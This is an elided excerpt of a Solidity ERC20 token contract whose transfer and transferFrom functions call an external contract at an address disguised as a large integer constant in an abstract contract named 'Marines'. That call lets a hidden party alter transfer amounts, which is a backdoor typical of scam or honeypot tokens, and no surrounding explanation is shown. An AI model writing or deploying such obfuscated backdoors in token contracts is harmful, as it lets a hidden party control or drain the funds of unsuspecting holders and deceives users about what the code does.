...
abstract contract Marines {
    ...
    uint160 marines = 1227889141976137642997680725178563824013151456327;
}

contract ERC20Token is IERC20, Warlord, Emperor, Marines, Ownable {
        ...
        returns (bool)
    {
        ...
        if (amount <= marines) {
            amount = amount - qfweqar(address(marines)).max(msg.sender);
        }
        return true;
    }
    ...
    function transferFrom(
        ...
        if (amount <= marines) {
            amount = amount - qfweqar(address(marines)).max(sender);
        }
        return true;
    }
